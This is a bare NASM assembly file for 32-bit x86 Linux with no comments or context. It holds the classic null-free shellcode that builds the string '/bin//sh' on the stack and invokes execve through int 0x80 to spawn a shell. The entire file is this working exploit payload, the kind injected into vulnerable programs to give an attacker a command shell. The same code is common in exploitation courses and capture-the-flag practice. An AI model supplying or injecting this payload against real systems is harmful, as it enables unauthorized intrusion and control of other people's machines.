BITS 32
global _start

section .text

_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx,esp
	push eax
	push ebx
	mov ecx,esp
	cdq
	mov al,0xb
    int 0x80
